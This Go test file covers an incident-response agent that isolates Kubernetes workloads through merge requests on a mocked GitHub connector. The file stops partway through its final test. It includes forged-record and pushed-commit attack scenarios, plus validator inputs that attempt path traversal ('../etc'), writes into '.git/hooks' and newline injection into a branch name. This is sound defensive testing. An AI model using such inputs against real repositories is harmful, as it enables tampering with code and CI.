// SPDX-License-Identifier: Elastic-2.0
// Copyright 2026 Zero Root AI

package isolate_test

import (
	"context"
	"crypto/sha1" //nolint:gosec // git object ids are SHA-1 in a SHA-1 repository
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/zeroroot-ai/incident-agent/internal/incident"
	"github.com/zeroroot-ai/incident-agent/internal/isolate"
	"github.com/zeroroot-ai/incident-agent/internal/respond"
	"github.com/zeroroot-ai/sdk/agent"
	"google.golang.org/protobuf/proto"
	"google.golang.org/protobuf/types/known/structpb"
)

const incidentKey = "incident-7"

const gh = "mcp:github-fixloop:"

type mr struct {
	state, branch, sha string
	files              []map[string]any
}

// sha is the head commit that the mock gives to the nth merge request that it
// opens.
func sha(n int) string { return fmt.Sprintf("%040x", n) }

// forge puts a merge request on the host and returns the record value that
// names it, as a writer of the graph would plant it.
func forge(g *gitHost, ref, state, branch string) string {
	g.prs[ref] = &mr{state: state, branch: branch, sha: sha(900)}
	return ref + "@" + sha(900)
}

// gitHost is a mock of the Git host behind the connector github-fixloop. It
// answers the tools through the invoke_tool shape of the daemon:
// {"result": <structured content of the tool>}. It follows the rules of the
// real server (zeroroot-ai/connectors github-fixloop README):
//
//   - merge_merge_request merges only when the pipeline is green. Otherwise
//     the result has merged false and the state open. A merge request that is
//     merged already gives an error, as GitHub answers HTTP 405.
//   - merge_request_state reads the state and the source branch from the host
//     on each call.
//   - A merge applies its files to the base branch. read_file reads that
//     branch. revert undoes a merge.
//   - open_merge_request, close_merge_request and read_file do not exist in
//     v0.2.0 of the server. The mock answers them only when tools is true.
//     Otherwise the daemon refuses them as an unknown tool.
//
// The mock fails the test when the agent calls a tool that a containment
// must not call: the health signal of a deploy, or the revert.
type gitHost struct {
	t     *testing.T
	tools bool
	green bool
	// denied lists the tool ids that the daemon refuses for the grant.
	denied map[string]bool

	// beforeMerge runs when the connector gets a merge call, before it checks
	// the head. A test uses it to push a commit in the gap.
	beforeMerge func(ref string)

	// foreign are files that a person committed on the branch before the open.
	// tamper changes the content of the first file of the change on the
	// branch. noFiles makes merge_request_state return no changed_files.
	foreign []map[string]any
	tamper  bool
	noFiles bool
	// truncated makes the list of changed files carry the truncated flag.
	// rename makes the first entry a rename. wide makes the repository use
	// SHA-256 object ids.
	truncated, rename, wide bool
	// mode is the mode of the first written file. modeChanged makes the first
	// entry a change of the mode. filesError makes the connector return the
	// error and no list, as it does when the head moved.
	mode        string
	modeChanged bool
	filesError  string

	opened []map[string]any
	prs    map[string]*mr
	base   map[string]string // path -> content on the base branch
	calls  []string
}

func newHost(t *testing.T) *gitHost {
	t.Helper()
	return &gitHost{t: t, tools: true, green: true, prs: map[string]*mr{},
		base: map[string]string{}, denied: map[string]bool{}}
}

func (g *gitHost) count(tool string) int {
	n := 0
	for _, c := range g.calls {
		if c == gh+tool {
			n++
		}
	}
	return n
}

// revert removes a file from the base branch, as a person who reverts the merge.
func (g *gitHost) revert(path string) { delete(g.base, path) }

func (g *gitHost) CallToolProto(
	_ context.Context, name string, request, response proto.Message, _ ...agent.ToolCallOption,
) error {
	g.t.Helper()
	if name != respond.InvokeTool {
		g.t.Fatalf("the agent called %q, and it may call only invoke_tool", name)
	}
	req, ok := request.(*structpb.Struct)
	if !ok {
		g.t.Fatalf("the request is %T, want a struct", request)
	}
	in := req.AsMap()
	id, _ := in["id"].(string)
	args, _ := in["args"].(map[string]any)
	g.calls = append(g.calls, id)
	if g.denied[id] {
		return errors.New("metatool: not authorized to invoke tool " + id)
	}
	ref, _ := args["merge_request"].(string)
	var result map[string]any
	switch strings.TrimPrefix(id, gh) {
	case isolate.ToolOpen:
		if !g.tools {
			return errors.New("tool not found: " + id)
		}
		g.opened = append(g.opened, args)
		ref = fmt.Sprintf("acme/manifests#%d", len(g.opened))
		files, _ := args["files"].([]any)
		branch, _ := args["branch"].(string)
		m := &mr{state: "open", sha: g.commit(len(g.opened)), branch: branch}
		for _, f := range files {
			m.files = append(m.files, f.(map[string]any)) //nolint:forcetypeassert // the mock controls the args
		}
		if g.tamper {
			m.files[0] = map[string]any{"path": m.files[0]["path"], "content": "kind: Nothing\n"}
		}
		m.files = append(m.files, g.foreign...)
		g.prs[ref] = m
		result = map[string]any{"merge_request": ref, "head_sha": g.prs[ref].sha}
	case isolate.ToolMerge:
		return g.merge(response, ref, args)
	case isolate.ToolState:
		m, known := g.prs[ref]
		if !known {
			return errors.New("connector mcp: merge_request_state reported an error: not found")
		}
		result = map[string]any{"state": m.state, "source_branch": m.branch, "head_sha": m.sha, "pipeline_green": g.green}
		if !g.noFiles {
			result["changed_files"] = g.listFiles(m)
			if g.filesError != "" {
				result["changed_files"] = []any{}
				result["changed_files_error"] = g.filesError
			}
			if g.truncated {
				result["changed_files_truncated"] = true
			}
		}
	case isolate.ToolClose:
		if !g.tools {
			return errors.New("tool not found: " + id)
		}
		g.prs[ref].state = "closed"
		result = map[string]any{"state": "closed"}
	case isolate.ToolReadFile:
		if !g.tools {
			return errors.New("tool not found: " + id)
		}
		path, _ := args["path"].(string)
		c, found := g.base[path]
		result = map[string]any{"found": found, "content": c}
	default:
		g.t.Fatalf("the agent called %s: an isolation never reads a health signal or reverts", id)
	}
	return g.answer(response, result)
}

// commit is the head commit of the nth merge request.
func (g *gitHost) commit(n int) string {
	if g.wide {
		return fmt.Sprintf("%064x", n)
	}
	return sha(n)
}

// blob is the git blob id of a file, computed as git does.
func (g *gitHost) blob(content string) string {
	data := []byte("blob " + strconv.Itoa(len(content)) + "\x00" + content)
	if g.wide {
		sum := sha256.Sum256(data)
		return hex.EncodeToString(sum[:])
	}
	sum := sha1.Sum(data) //nolint:gosec // git object ids are SHA-1 in a SHA-1 repository
	return hex.EncodeToString(sum[:])
}

// listFiles is changed_files as the connector returns it: a path, a kind of
// change and a blob id, and no content. A deleted file has an empty blob id.
func (g *gitHost) listFiles(m *mr) []any {
	out := make([]any, 0, len(m.files))
	for i, f := range m.files {
		path, _ := f["path"].(string)
		entry := map[string]any{"path": path, "change": "deleted", "blob_sha": ""}
		if f["delete"] != true {
			content, _ := f["content"].(string)
			entry["change"], entry["blob_sha"] = "added", g.blob(content)
			if i == 0 && g.mode != "" {
				entry["mode"] = g.mode
			}
			if _, has := g.base[path]; has {
				entry["change"] = "modified"
			}
		}
		if g.modeChanged && i == 0 {
			entry["change"] = "mode_changed"
		}
		if g.rename && i == 0 {
			entry["change"], entry["previous_path"] = "renamed", "contain/old.yaml"
		}
		out = append(out, entry)
	}
	return out
}

// merge answers merge_merge_request.
func (g *gitHost) merge(response proto.Message, ref string, args map[string]any) error {
	m, known := g.prs[ref]
	switch {
	case !known:
		return errors.New("connector mcp: merge_merge_request on \"x\" reported an error: not found")
	case m.state == "merged":
		return errors.New("connector mcp: merge_merge_request on \"x\" reported an error: HTTP 405 already merged")
	}
	if g.beforeMerge != nil {
		g.beforeMerge(ref)
	}
	// GitHub refuses the merge with HTTP 409 when the head is not the sha of
	// the call. The connector then returns merged false.
	if expected, _ := args["sha"].(string); expected != m.sha {
		return g.answer(response, map[string]any{"state": m.state, "merged": false})
	}
	if g.green {
		m.state = "merged"
		for _, f := range m.files {
			p, _ := f["path"].(string)
			if f["delete"] == true {
				delete(g.base, p)
			} else {
				g.base[p], _ = f["content"].(string)
			}
		}
	}
	return g.answer(response, map[string]any{"state": m.state, "merged": m.state == "merged"})
}

func (g *gitHost) answer(response proto.Message, result map[string]any) error {
	g.t.Helper()
	out, err := structpb.NewStruct(map[string]any{"result": result})
	if err != nil {
		g.t.Fatalf("encode: %v", err)
	}
	proto.Merge(response, out)
	return nil
}

// push adds a commit to the branch of a merge request, as a person with push
// access does. The head changes, and the new commit holds a file.
func (g *gitHost) push(ref string) {
	m := g.prs[ref]
	m.sha = sha(500 + len(g.calls))
	m.files = append(m.files, map[string]any{"path": "contain/evil.yaml", "content": "kind: Evil\n"})
}

// store is the Incident node of a test. It is the recorder and the reader.
type store struct {
	records map[string]string
	causes  []incident.Cause
	held    string
	readErr error
	// failWrite makes the next write of a record with this prefix fail.
	failWrite string
}

func (s *store) RecordValue(_ context.Context, _, name, value string) error {
	if s.failWrite != "" && strings.HasPrefix(name, s.failWrite) {
		s.failWrite = ""
		return errors.New("the daemon is down")
	}
	s.records[name] = value
	return nil
}

func (s *store) Held(_ context.Context, _, reason string) error { s.held = reason; return nil }

func (s *store) Incident(_ context.Context, key string) (incident.Incident, error) {
	if s.readErr != nil {
		return incident.Incident{}, s.readErr
	}
	return incident.Incident{Key: key, Causes: s.causes, Records: copyMap(s.records)}, nil
}

func copyMap(m map[string]string) map[string]string {
	out := make(map[string]string, len(m))
	for k, v := range m {
		out[k] = v
	}
	return out
}

type causes struct{ id string }

func (c causes) OwnCause(context.Context, string) (string, error) { return c.id, nil }

func repoOf(kind string) isolate.Repo {
	return isolate.Repo{Connector: "github-fixloop", Project: "acme/manifests", BaseBranch: "main",
		Dir: "contain", PolicyKind: kind}
}

var repo = repoOf(isolate.KindCilium)

func workload(t *testing.T) isolate.Workload {
	t.Helper()
	w, err := isolate.ParseWorkload("payments", "app=ledger,tier=api")
	if err != nil {
		t.Fatalf("ParseWorkload: %v", err)
	}
	return w
}

func setupWith(t *testing.T, r isolate.Repo) (*gitHost, *store, isolate.Pass) {
	t.Helper()
	g := newHost(t)
	st := &store{records: map[string]string{}}
	host, err := isolate.NewToolHost(g, r)
	if err != nil {
		t.Fatalf("NewToolHost: %v", err)
	}
	return g, st, isolate.Pass{Reader: st, Host: host, Recorder: st, Causes: causes{id: "f-9"}, Repo: r}
}

func setup(t *testing.T) (*gitHost, *store, isolate.Pass) {
	t.Helper()
	return setupWith(t, repo)
}

func verify(st *store) {
	st.causes = []incident.Cause{{FindingID: "f-9", Status: incident.StatusVerified}}
}

func joined(s isolate.Summary) string { return strings.Join(s.Lines, "\n") }

func TestIsolate_OpensAndMergesAndRecords(t *testing.T) {
	g, st, p := setup(t)
	w := workload(t)
	sum, err := p.Isolate(context.Background(), incidentKey, w)
	if err != nil {
		t.Fatalf("Isolate: %v", err)
	}
	if !sum.Merged || !sum.OnBase {
		t.Fatalf("merged = %v, on base = %v: %v", sum.Merged, sum.OnBase, sum.Lines)
	}
	args := g.opened[0]
	if args["project"] != "acme/manifests" || args["base_branch"] != "main" {
		t.Errorf("the merge request targets %v, %v", args["project"], args["base_branch"])
	}
	if _, has := args["inputs"]; has {
		t.Errorf("the open call names a finding. The daemon would then link the cause finding to this merge request")
	}
	if args["branch"] != isolate.IsolationBranch(repo.Key(incidentKey, w), 1) {
		t.Errorf("branch = %v", args["branch"])
	}
	ck := repo.Key(incidentKey, w)
	if got := st.records["ir_isolation_merged_"+ck+"_1"]; got != "acme/manifests#1@"+sha(1) {
		t.Errorf("merged record = %q, records = %v", got, st.records)
	}
	for name := range st.records {
		if strings.HasPrefix(name, "ir_isolation_bypass_") {
			t.Errorf("a cilium isolation wrote the bypass record %s", name)
		}
	}
	if strings.Contains(strings.ToLower(joined(sum)), "isolated") {
		t.Errorf("the report says isolated, and a merge is not an application: %v", sum.Lines)
	}
}

func TestIsolate_SecondDispatchOpensAndMergesNothing(t *testing.T) {
	g, _, p := setup(t)
	w := workload(t)
	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("first: %v", err)
	}
	g.calls = nil
	sum, err := p.Isolate(context.Background(), incidentKey, w)
	if err != nil || !sum.Merged || len(g.opened) != 1 {
		t.Fatalf("merged = %v, opened = %d, err = %v", sum.Merged, len(g.opened), err)
	}
	if g.count(isolate.ToolOpen)+g.count(isolate.ToolMerge) != 0 {
		t.Fatalf("the second dispatch called %v", g.calls)
	}
}

func TestIsolate_PendingChecksKeepOneMergeRequest(t *testing.T) {
	g, st, p := setup(t)
	g.green = false
	w := workload(t)
	sum, err := p.Isolate(context.Background(), incidentKey, w)
	if err != nil {
		t.Fatalf("first: %v", err)
	}
	ck := repo.Key(incidentKey, w)
	if sum.Merged || st.records["ir_isolation_merged_"+ck+"_1"] != "" {
		t.Fatalf("a merge request that did not merge counts as merged: %v", sum.Lines)
	}
	if st.records["ir_isolation_opened_"+ck+"_1"] == "" {
		t.Fatalf("the open merge request is not recorded, so the next dispatch opens a second one")
	}
	g.green = true
	sum, err = p.Isolate(context.Background(), incidentKey, w)
	if err != nil || !sum.Merged || len(g.opened) != 1 {
		t.Fatalf("second: merged = %v, opened = %d, err = %v", sum.Merged, len(g.opened), err)
	}
}

func TestIsolate_DaemonRefusalRecordsNothing(t *testing.T) {
	for _, tool := range []string{isolate.ToolOpen, isolate.ToolMerge} {
		t.Run(tool, func(t *testing.T) {
			g, st, p := setup(t)
			g.denied[gh+tool] = true
			sum, err := p.Isolate(context.Background(), incidentKey, workload(t))
			if err != nil || sum.Merged || !strings.Contains(joined(sum), "refused") {
				t.Fatalf("merged = %v, err = %v, lines = %v", sum.Merged, err, sum.Lines)
			}
			for name := range st.records {
				if strings.HasPrefix(name, "ir_isolation_merged_") {
					t.Fatalf("a refused call wrote %s", name)
				}
			}
		})
	}
}

// The connectors of v0.2.0 have no open_merge_request. The daemon answers
// with an unknown tool, and the pass must change nothing and say why.
func TestIsolate_ConnectorWithoutTheOpenTool(t *testing.T) {
	g, st, p := setup(t)
	g.tools = false
	sum, err := p.Isolate(context.Background(), incidentKey, workload(t))
	if err != nil || sum.Merged || len(st.records) != 0 || len(g.calls) != 1 {
		t.Fatalf("merged = %v, err = %v, records = %v, calls = %v", sum.Merged, err, st.records, g.calls)
	}
	if !strings.Contains(joined(sum), "failed") {
		t.Fatalf("the report does not say that the open call failed: %v", sum.Lines)
	}
}

// M2. A writer of the graph plants a record. The agent reads the merge request
// on the host and trusts it only on the expected branch in the configured
// project.
func TestIsolate_ForgedOpenedRecordIsNeverMerged(t *testing.T) {
	for name, tc := range map[string]struct{ ref, branch string }{
		"another branch":  {"acme/manifests#99", "attacker/payload"},
		"another project": {"evil/other#99", "zeroroot/isolate-x-1"},
		"a url":           {"https://git.example/acme/manifests/pull/99", "x"},
	} {
		t.Run(name, func(t *testing.T) {
			g, st, p := setup(t)
			w := workload(t)
			st.records["ir_isolation_opened_"+repo.Key(incidentKey, w)+"_1"] = forge(g, tc.ref, "open", tc.branch)
			sum, err := p.Isolate(context.Background(), incidentKey, w)
			if err != nil {
				t.Fatalf("Isolate: %v", err)
			}
			if sum.Merged || g.count(isolate.ToolMerge) != 0 || g.prs[tc.ref].state != "open" {
				t.Fatalf("the agent merged a merge request that a record named: %v", sum.Lines)
			}
		})
	}
}

func TestIsolate_ForgedMergedRecordIsNotTrusted(t *testing.T) {
	g, st, p := setup(t)
	w := workload(t)
	// The host shows a merged merge request on another branch.
	forged := forge(g, "acme/manifests#99", "merged", "someone/else")
	st.records["ir_isolation_merged_"+repo.Key(incidentKey, w)+"_1"] = forged
	sum, err := p.Isolate(context.Background(), incidentKey, w)
	if err != nil || sum.Merged {
		t.Fatalf("merged = %v, err = %v: %v", sum.Merged, err, sum.Lines)
	}
}

func TestRelease_ForgedRecordsAreNotTrusted(t *testing.T) {
	for name, set := range map[string]func(g *gitHost, st *store, ck string){
		"merged record on another branch": func(g *gitHost, st *store, ck string) {
			st.records["ir_isolation_merged_"+ck+"_1"] = forge(g, "acme/manifests#99", "merged", "someone/else")
		},
		"release record on another branch": func(g *gitHost, st *store, ck string) {
			g.base[repo.PolicyPath(ck)] = "x"
			st.records["ir_isolation_merged_"+ck+"_1"] = forge(g, "acme/manifests#1", "merged", isolate.IsolationBranch(ck, 1))
			st.records["ir_release_opened_"+ck+"_1"] = forge(g, "acme/manifests#99", "open", "attacker/payload")
		},
	} {
		t.Run(name, func(t *testing.T) {
			g, st, p := setup(t)
			w := workload(t)
			set(g, st, repo.Key(incidentKey, w))
			verify(st)
			sum, err := p.Release(context.Background(), incidentKey, w)
			if err != nil || sum.Released || g.count(isolate.ToolMerge) != 0 || len(g.opened) != 0 {
				t.Fatalf("released = %v, err = %v, calls = %v, lines = %v", sum.Released, err, g.calls, sum.Lines)
			}
		})
	}
}

// M3. The record write fails after the merge. The next dispatch must not
// merge again: the host refuses a second merge, and the agent would never
// record the isolation.
func TestIsolate_RecordFailureAfterTheMergeDoesNotLoseTheIsolation(t *testing.T) {
	g, st, p := setup(t)
	w := workload(t)
	st.failWrite = "ir_isolation_merged_"
	if _, err := p.Isolate(context.Background(), incidentKey, w); err == nil {
		t.Fatalf("the failed record write returned no error")
	}
	sum, err := p.Isolate(context.Background(), incidentKey, w)
	if err != nil {
		t.Fatalf("second dispatch: %v", err)
	}
	if g.count(isolate.ToolMerge) != 1 {
		t.Fatalf("the agent called the merge %d times, want 1", g.count(isolate.ToolMerge))
	}
	ck := repo.Key(incidentKey, w)
	if !sum.Merged || st.records["ir_isolation_merged_"+ck+"_1"] == "" {
		t.Fatalf("merged = %v, records = %v: %v", sum.Merged, st.records, sum.Lines)
	}
	// The release now runs.
	verify(st)
	if rs, err := p.Release(context.Background(), incidentKey, w); err != nil || !rs.Released {
		t.Fatalf("release: %v, %v", err, rs.Lines)
	}
}

// M4. A revert shows up: the policy is gone from the base branch.
func TestIsolate_RevertedPolicyIsIsolatedAgain(t *testing.T) {
	g, st, p := setup(t)
	w := workload(t)
	ck := repo.Key(incidentKey, w)
	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("first: %v", err)
	}
	g.revert(repo.PolicyPath(ck))
	sum, err := p.Isolate(context.Background(), incidentKey, w)
	if err != nil {
		t.Fatalf("second: %v", err)
	}
	if st.records["ir_isolation_reverted_"+ck+"_1"] == "" {
		t.Fatalf("the revert is not recorded: %v", st.records)
	}
	if len(g.opened) != 2 || g.opened[1]["branch"] != isolate.IsolationBranch(ck, 2) {
		t.Fatalf("opened = %d: the agent did not isolate again in generation 2", len(g.opened))
	}
	if !sum.Merged || !sum.OnBase || g.base[repo.PolicyPath(ck)] == "" {
		t.Fatalf("merged = %v, on base = %v: %v", sum.Merged, sum.OnBase, sum.Lines)
	}
}

func TestIsolate_EditedPolicyCountsAsReverted(t *testing.T) {
	g, st, p := setup(t)
	w := workload(t)
	ck := repo.Key(incidentKey, w)
	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("first: %v", err)
	}
	g.base[repo.PolicyPath(ck)] = "kind: Nothing\n"
	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("second: %v", err)
	}
	if st.records["ir_isolation_reverted_"+ck+"_1"] == "" {
		t.Fatalf("the edit is not recorded as a revert: %v", st.records)
	}
}

func TestIsolate_NoReadFileToolMeansMergedAndNotConfirmed(t *testing.T) {
	g, _, p := setup(t)
	w := workload(t)
	// The merge works. The read tool does not exist yet.
	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("first: %v", err)
	}
	g.tools = false
	sum, err := p.Isolate(context.Background(), incidentKey, w)
	if err != nil || !sum.Merged || sum.OnBase {
		t.Fatalf("merged = %v, on base = %v, err = %v", sum.Merged, sum.OnBase, err)
	}
	if !strings.Contains(joined(sum), "cannot confirm") {
		t.Fatalf("the report does not say that the base branch is not confirmed: %v", sum.Lines)
	}
}

func TestIsolate_NamespaceOfTheGitOpsControllerIsRefused(t *testing.T) {
	r := repo
	r.ControllerNamespaces = []string{"platform-cd"}
	for _, ns := range []string{"argocd", "flux-system", "platform-cd"} {
		t.Run(ns, func(t *testing.T) {
			g, _, p := setupWith(t, r)
			w, err := isolate.ParseWorkload(ns, "app=x")
			if err != nil {
				t.Fatalf("ParseWorkload: %v", err)
			}
			if _, err := p.Isolate(context.Background(), incidentKey, w); err == nil || len(g.calls) != 0 {
				t.Fatalf("err = %v, calls = %v: the agent isolated the namespace of the controller", err, g.calls)
			}
			if _, err := p.Release(context.Background(), incidentKey, w); err == nil {
				t.Fatalf("release accepted the namespace of the controller")
			}
		})
	}
}

func TestClusterFieldMovesTheFilesAndTheKey(t *testing.T) {
	r := repo
	r.Cluster = "prod-eu"
	w := workload(t)
	if repo.Key(incidentKey, w) == r.Key(incidentKey, w) {
		t.Errorf("two clusters share the key of a containment")
	}
	g, _, p := setupWith(t, r)
	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("Isolate: %v", err)
	}
	files, _ := g.opened[0]["files"].([]any)
	for _, f := range files {
		path, _ := f.(map[string]any)["path"].(string)
		if !strings.HasPrefix(path, "contain/prod-eu/") {
			t.Errorf("the file %s is not in the directory of the cluster", path)
		}
	}
}

func TestIsolate_NetworkPolicyKindStatesTheBypass(t *testing.T) {
	g, st, p := setupWith(t, repoOf(isolate.KindNetworkPolicy))
	w := workload(t)
	sum, err := p.Isolate(context.Background(), incidentKey, w)
	if err != nil || !sum.Merged {
		t.Fatalf("Isolate: %v, %v", err, sum.Lines)
	}
	for _, want := range []string{"add up", "does not enforce policy", "hostNetwork"} {
		if !strings.Contains(joined(sum), want) {
			t.Errorf("the report lacks %q: %v", want, sum.Lines)
		}
	}
	bypass := "ir_isolation_bypass_" + repoOf(isolate.KindNetworkPolicy).Key(incidentKey, w) + "_1"
	if !strings.Contains(st.records[bypass], "add up") {
		t.Errorf("the incident record lacks the bypass note: %v", st.records)
	}
	_ = g
}

func TestRelease_WaitsForVerified(t *testing.T) {
	for _, status := range []string{"open", "fixing", "fixed", ""} {
		t.Run("status "+status, func(t *testing.T) {
			g, st, p := setup(t)
			w := workload(t)
			if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
				t.Fatalf("Isolate: %v", err)
			}
			g.calls = nil
			st.causes = []incident.Cause{{FindingID: "f-9", Status: status}}
			sum, err := p.Release(context.Background(), incidentKey, w)
			if err != nil || sum.Released || sum.Held == "" || st.held == "" || len(g.calls) != 0 {
				t.Fatalf("released = %v, held = %q, calls = %v, err = %v", sum.Released, sum.Held, g.calls, err)
			}
		})
	}
}

func TestRelease_AfterVerifiedRemovesTheFilesWithASecondMergeRequest(t *testing.T) {
	g, st, p := setup(t)
	w := workload(t)
	ck := repo.Key(incidentKey, w)
	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("Isolate: %v", err)
	}
	verify(st)
	sum, err := p.Release(context.Background(), incidentKey, w)
	if err != nil || !sum.Released || len(g.opened) != 2 {
		t.Fatalf("released = %v, opened = %d, err = %v, lines = %v", sum.Released, len(g.opened), err, sum.Lines)
	}
	files, _ := g.opened[1]["files"].([]any)
	if len(files) != 2 {
		t.Fatalf("the release changes %d files, want 2", len(files))
	}
	for _, f := range files {
		m, _ := f.(map[string]any)
		if m["delete"] != true || m["content"] != nil {
			t.Errorf("the release file %v is not a delete", m)
		}
	}
	if len(g.base) != 0 {
		t.Errorf("files stay on the base branch: %v", g.base)
	}
	if st.records["ir_isolation_released_"+ck+"_1"] == "" {
		t.Errorf("no released record: %v", st.records)
	}
	g.calls = nil
	sum, err = p.Release(context.Background(), incidentKey, w)
	if err != nil || sum.Released || len(g.calls) != 0 {
		t.Fatalf("second release: released = %v, err = %v, calls = %v", sum.Released, err, g.calls)
	}
}

func TestRelease_AfterARevertHasNothingToRemove(t *testing.T) {
	g, st, p := setup(t)
	w := workload(t)
	ck := repo.Key(incidentKey, w)
	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("Isolate: %v", err)
	}
	g.revert(repo.PolicyPath(ck))
	verify(st)
	sum, err := p.Release(context.Background(), incidentKey, w)
	if err != nil || sum.Released || len(g.opened) != 1 {
		t.Fatalf("released = %v, opened = %d, err = %v", sum.Released, len(g.opened), err)
	}
	if st.records["ir_isolation_reverted_"+ck+"_1"] == "" {
		t.Fatalf("no reverted record: %v", st.records)
	}
}

// m1. An isolation merge request that never merged must not stay open after
// the release. Somebody could merge it later and isolate a healthy workload.
func TestRelease_ClosesAnIsolationMergeRequestThatNeverMerged(t *testing.T) {
	g, st, p := setup(t)
	g.green = false
	w := workload(t)
	ck := repo.Key(incidentKey, w)
	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("Isolate: %v", err)
	}
	verify(st)
	sum, err := p.Release(context.Background(), incidentKey, w)
	if err != nil {
		t.Fatalf("Release: %v", err)
	}
	if g.prs["acme/manifests#1"].state != "closed" || g.count(isolate.ToolMerge) != 1 {
		t.Fatalf("state = %q, merge calls = %d: %v", g.prs["acme/manifests#1"].state, g.count(isolate.ToolMerge), sum.Lines)
	}
	if st.records["ir_isolation_released_"+ck+"_1"] == "" || len(g.opened) != 1 {
		t.Fatalf("records = %v, opened = %d", st.records, len(g.opened))
	}
}

func TestRelease_CauseOfAnotherWriterDoesNotCount(t *testing.T) {
	g, st, p := setup(t)
	w := workload(t)
	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("Isolate: %v", err)
	}
	g.calls = nil
	st.causes = []incident.Cause{
		{FindingID: "f-9", Status: "fixing"},
		{FindingID: "f-evil", Status: incident.StatusVerified},
	}
	sum, err := p.Release(context.Background(), incidentKey, w)
	if err != nil || sum.Released || len(g.calls) != 0 {
		t.Fatalf("released = %v, err = %v, calls = %v", sum.Released, err, g.calls)
	}
}

func TestIsolateAfterReleaseStartsTheNextGeneration(t *testing.T) {
	g, st, p := setup(t)
	w := workload(t)
	ctx := context.Background()
	if _, err := p.Isolate(ctx, incidentKey, w); err != nil {
		t.Fatalf("Isolate: %v", err)
	}
	verify(st)
	if _, err := p.Release(ctx, incidentKey, w); err != nil {
		t.Fatalf("Release: %v", err)
	}
	if _, err := p.Isolate(ctx, incidentKey, w); err != nil {
		t.Fatalf("Isolate again: %v", err)
	}
	if len(g.opened) != 3 || g.opened[0]["branch"] == g.opened[2]["branch"] {
		t.Fatalf("opened = %d, branches %v and %v", len(g.opened), g.opened[0]["branch"], g.opened[len(g.opened)-1]["branch"])
	}
}

func TestPassRefusesWhenTheIncidentCannotBeRead(t *testing.T) {
	_, st, p := setup(t)
	st.readErr = agent.ErrKnowledgeUnavailable
	for name, run := range map[string]func() (isolate.Summary, error){
		"isolate": func() (isolate.Summary, error) { return p.Isolate(context.Background(), incidentKey, workload(t)) },
		"release": func() (isolate.Summary, error) { return p.Release(context.Background(), incidentKey, workload(t)) },
	} {
		if _, err := run(); !errors.Is(err, agent.ErrKnowledgeUnavailable) {
			t.Errorf("%s: err = %v, want ErrKnowledgeUnavailable", name, err)
		}
	}
}

func TestRepoCheck(t *testing.T) {
	ok := func(f func(*isolate.Repo)) isolate.Repo { r := repo; f(&r); return r }
	bad := map[string]isolate.Repo{
		"not a git host":        ok(func(r *isolate.Repo) { r.Connector = "okta-response" }),
		"no project":            ok(func(r *isolate.Repo) { r.Project = "" }),
		"empty dir":             ok(func(r *isolate.Repo) { r.Dir = "" }),
		"dir up":                ok(func(r *isolate.Repo) { r.Dir = "../etc" }),
		"absolute dir":          ok(func(r *isolate.Repo) { r.Dir = "/abs" }),
		"github dir":            ok(func(r *isolate.Repo) { r.Dir = ".github/workflows" }),
		"nested hidden dir":     ok(func(r *isolate.Repo) { r.Dir = "a/.github" }),
		"git dir":               ok(func(r *isolate.Repo) { r.Dir = ".git/hooks" }),
		"upper case dir":        ok(func(r *isolate.Repo) { r.Dir = "Contain" }),
		"space in dir":          ok(func(r *isolate.Repo) { r.Dir = "a b" }),
		"double slash":          ok(func(r *isolate.Repo) { r.Dir = "a//b" }),
		"trailing slash":        ok(func(r *isolate.Repo) { r.Dir = "a/" }),
		"cluster with a slash":  ok(func(r *isolate.Repo) { r.Cluster = "a/b" }),
		"hidden cluster":        ok(func(r *isolate.Repo) { r.Cluster = ".github" }),
		"no policy kind":        ok(func(r *isolate.Repo) { r.PolicyKind = "" }),
		"unknown policy kind":   ok(func(r *isolate.Repo) { r.PolicyKind = "calico" }),
		"newline in the branch": ok(func(r *isolate.Repo) { r.BaseBranch = "ma\nin" }),
	}
	for name, r := range bad {
		if err := r.Check(); err == nil {
			t.Errorf("%s: Check(%+v) = nil, want an error", name, r)
		}
	}
	for _, r := range []isolate.Repo{
		ok(func(r *isolate.Repo) { r.Connector = "gitlab-fixloop"; r.Dir = "k8s/prod"; r.Cluster = "eu-1" }),
		ok(func(r *isolate.Repo) { r.PolicyKind = isolate.KindCluster }),
		ok(func(r *isolate.Repo) { r.PolicyKind = isolate.KindNetworkPolicy }),
	} {
		if err := r.Check(); err != nil {
			t.Errorf("Check(%+v) = %v", r, err)
		}
	}
	if !slices.Contains([]string{"cilium", "cluster", "networkpolicy"}, isolate.KindCilium) {
		t.Fatalf("kind names changed")
	}
}

// A record without a head commit is not trusted. A record from before the
// head commit was recorded has no place in this code path.
func TestIsolate_RecordWithoutAHeadCommitIsNotTrusted(t *testing.T) {
	bad := strings.Repeat("g", 40)
	for _, rec := range []string{"acme/manifests#1", "acme/manifests#1@abc", "acme/manifests#1@" + bad} {
		g, st, p := setup(t)
		w := workload(t)
		branch := isolate.IsolationBranch(repo.Key(incidentKey, w), 1)
		g.prs["acme/manifests#1"] = &mr{state: "open", branch: branch, sha: sha(1)}
		st.records["ir_isolation_opened_"+repo.Key(incidentKey, w)+"_1"] = rec
		sum, err := p.Isolate(context.Background(), incidentKey, w)
		if err != nil || sum.Merged || g.count(isolate.ToolMerge) != 0 {
			t.Fatalf("%q: merged = %v, err = %v, calls = %v", rec, sum.Merged, err, g.calls)
		}
	}
}

// Major 2. The branch name does not show a commit that a person adds. The
// agent records the head commit when it opens the merge request, refuses a
// merge request whose head differs, and sends the commit to the merge call.
func TestIsolate_CommitPushedAfterTheOpenIsNeverMerged(t *testing.T) {
	g, st, p := setup(t)
	g.green = false // the checks are pending, so the first dispatch leaves the merge request open
	w := workload(t)
	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
